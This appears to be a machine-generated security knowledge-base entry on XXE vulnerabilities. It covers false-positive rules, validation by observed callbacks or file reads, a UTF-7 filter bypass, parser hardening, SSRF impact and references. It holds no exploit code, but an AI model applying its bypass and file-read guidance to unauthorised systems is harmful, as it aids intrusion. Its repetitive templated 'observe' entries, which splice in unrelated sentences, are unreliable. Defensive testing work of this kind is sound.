**Reject a xxe finding until it is distinguished from the adjacent behaviour this class also covers. "A parser that accepts a DOCTYPE declaration and resolves its entity is the enabling condition for XXE; the submitted payload alone proves nothing." and "An XXE finding is validated only when an inbound HTTP request to the supplied entity URL was actually observed on a listener you control." share a surface and a symptom, so a response that matches the first is not evidence for it while the second remains possible.**

Hypothesis under test: A parser that accepts a DOCTYPE declaration and resolves its entity is the enabling condition for XXE; the submitted payload alone proves nothing.

Adjacent behaviour that produces the same observable result: An XXE finding is validated only when an inbound HTTP request to the supplied entity URL was actually observed on a listener you control.

Why this is worth checking before reporting: both are recorded in this class as gated knowledge, so a tester who stops at the first match will report one of them. The two differ in what the server actually did with the input, and that difference is observable in the response rather than in the request.

Required before treating this as a finding: capture the response that demonstrates the first behaviour specifically, and confirm the second is not what was observed.

*Disproof:* This rule is wrong if a controlled test shows the two behaviours can never co-occur on the same surface, or if the corpus entry for "An XXE finding is validated only when an inbound HTTP request to the s" is out of date. In that case this class needs its false-positive guidance rewritten rather than deleted.

**A parser configured with network access disabled is not thereby safe against XXE, because a file:// or relative entity reference needs no network and the local-file read is the higher-value impact; a tester who stops at the network probe will miss it.**

Mechanism: A parser configured with network access disabled is not thereby safe against XXE, because a file:// or relative entity reference needs no network and the local-file read is the higher-value impact; a tester who stops at the network probe will miss it. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The rule is wrong when entity resolution is disabled outright — not merely network-restricted — because with resolve_entities off the external entity is never substituted and neither local nor remote disclosure is possible; the network flag alone is the insufficient control, the resolution flag is the effective one.

*Disproof:* The rule is wrong when entity resolution is disabled outright — not merely network-restricted — because with resolve_entities off the external entity is never substituted and neither local nor remote disclosure is possible; the network flag alone is the insufficient control, the resolution flag is the effective one.

**An XXE filter that greps for a keyword in one encoding is a false-negative source, so a single clean probe never proves the target is safe.**

If the target halts XML processing when an external entity is detected, re-send the same document in a different encoding such as UTF-7 and compare. A filter matching decoded UTF-8 text can be stepped around by an encoding the decoder resolves later, which is exactly how a published advisory's check was bypassed. Run at least two encodings before closing an XXE item as fixed.

*Disproof:* If both the UTF-8 and alternate-encoding probes are rejected with the entity never resolved, the blocklist holds for the encodings tested and the bypass does not reproduce.

## Validation

**The most reliable remediation is to disable DTD processing and external entity resolution in every parser instance, and never parse untrusted XML with default settings.**

The safest way to prevent XXE is to disable DTDs (external entities) completely; if that is not possible, disable external general and parameter entities, disable external DTD loading, disable XInclude, enable secure processing mode, and limit entity expansion. Parser-specific controls are required because behavior varies by language and parser, and the OWASP cheat sheet warns that an unsupported security setting is a configuration failure and that partial hardening is not sufficient.

*Disproof:* Enabling only one control, such as only disabling external entities, leaves other features exposed; the OWASP parser security features matrix shows that missing 'Disallow DOCTYPE Declaration' or 'Disable External DTD Loading' still leaves classic XXE or blind XXE exploitable.

**An XXE finding is validated only when an inbound HTTP request to the supplied entity URL was actually observed on a listener you control.**

Stand up a listener and treat any inbound GET as the only acceptable proof that resolution occurred. Re-run twice to exclude transient failures, and record the timestamp, requested path and source address. The callback is what separates a real finding from a payload that merely appeared in a request body, and it is evidence an operator can independently reproduce.

*Disproof:* No inbound request to the entity URL means entity resolution did not occur and the XXE finding is not reproducible, no matter how alarming the submitted payload looked.

**An XXE is proved by the parser resolving an external reference to a resource the submitted document never contained — a request the server issued to an attacker-controlled listener, or file content appearing that only exists on the host — because that is the observable effect entity resolution causes.**

Mechanism: An XXE is proved by the parser resolving an external reference to a resource the submitted document never contained — a request the server issued to an attacker-controlled listener, or file content appearing that only exists on the host — because that is the observable effect entity resolution causes. How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The claim is false when the environment blocks resolution so the payload produces a silent parse error or empty result with no outbound request; in that case the finding is a configuration weakness established by the parser defaults rather than a live XXE, and it must be reported as such instead of as a demonstrated read.

*Disproof:* The claim is false when the environment blocks resolution so the payload produces a silent parse error or empty result with no outbound request; in that case the finding is a configuration weakness established by the parser defaults rather than a live XXE, and it must be reported as such instead of as a demonstrated read.

**To decide this case, observe: Mechanism: A parsed document that returned 200 with a defined entity reflected in the output is not an XXE finding; the entity may have been expanded from the document's own internal DTD, which is normal XML processing, and the flaw requires the parser to resolve a reference to an external resource or a local file.**

Derived from xxe.fp_rule.an_expanded_custom_entity_proves_nothing_without_evidence_the_parser_resolved_an_external_reference, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xxe.fp_rule.an_expanded_custom_entity_proves_nothing_without_evidence_the_parser_resolved_an_external_reference) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from xxe.fp_rule.blocking_network_access_alone_does_not_prevent_local_file_disclosure, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xxe.fp_rule.blocking_network_access_alone_does_not_prevent_local_file_disclosure) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from xxe.validation.proof_is_a_reference_resolved_to_a_resource_the_submitted_document_did_not_contain, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xxe.validation.proof_is_a_reference_resolved_to_a_resource_the_submitted_document_did_not_contain) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from xxe.bypass.entities_parsed_by_a_framework_level_xml_pipeline_escape_the_endpoint_level_configuration, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xxe.bypass.entities_parsed_by_a_framework_level_xml_pipeline_escape_the_endpoint_level_configuration) states the full boundary.

**To decide this case, observe: Hypothesis under test: A parser that accepts a DOCTYPE declaration and resolves its entity is the enabling condition for XXE; the submitted payload alone proves nothing.**

Derived from xxe.fp_rule.auto.derived, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xxe.fp_rule.auto.derived) states the full boundary.

## Impact

**XXE external entities that use http:// URIs force the server to make outbound requests, enabling SSRF against internal systems, internal port scanning, and use of the server's trust relationship to bypass firewalls.**

Aside from file retrieval, the main impact of XXE is SSRF: by defining an external entity with a URL you want to target and referencing it in a data value, you gain two-way interaction with the back-end system when the entity is reflected; otherwise you can still perform blind SSRF. CWE-611 states that a crafted DTD using URIs with schemes such as http:// forces the application to make outgoing HTTP requests to servers the attacker cannot reach directly, which can bypass firewall restrictions, hide the source of attacks such as port scanning, or otherwise leverage the server's trust relationship with other entities.

*Disproof:* If the parser refuses HTTP(S) external entities and disables file:// entities, or the server lacks outbound network access, the SSRF impact is not exploitable; and if responses to the triggered requests are not observable, blind SSRF becomes a harder signal that requires out-of-band detection.

## Related Bug Classes

Not yet researched.

## References

- **bishopfox.com** (report)
  - <https://bishopfox.com/blog/phpspreadsheet-versions1.5.0-xxe-advisory>
- **cheatsheetseries.owasp.org** (primary)
  - <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
- **cwe.mitre.org** (taxonomy)
  - <https://cwe.mitre.org/data/definitions/611.html>
- **lxml.de** (writeup)
  - <https://lxml.de/FAQ.html>
  - <https://lxml.de/parsing.html>
- **php.net** (writeup)
  - <https://www.php.net/manual/en/function.simplexml-load-string.php>
- **portswigger.net** (research)
  - <https://portswigger.net/web-security/xxe>
  - <https://portswigger.net/web-security/xxe/blind>
  - <https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files>
- **raw.githubusercontent.com** (writeup)
  - <https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/30.%20Web%20Attacks/Web%20Attacks.md>
  - <https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xxe-xee-xml-external-entity.md>
  - <https://raw.githubusercontent.com/ajcriado/htb-writeups/main/Cheatsheets/Mix-OSCP-CPTS/Windows/3.%20Lateral%20Movement.md>
- **snyk.io** (writeup)
  - <https://snyk.io/blog/find-and-fix-xml-entity-vulnerabilities/>
  - <https://snyk.io/blog/nokogiri-xxe-vulnerabilities/>
- **tomcat.apache.org** (writeup)
  - <https://tomcat.apache.org/security-8.html>
- **w3.org** (docs)
  - <https://www.w3.org/TR/2008/REC-xml-20081126/>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
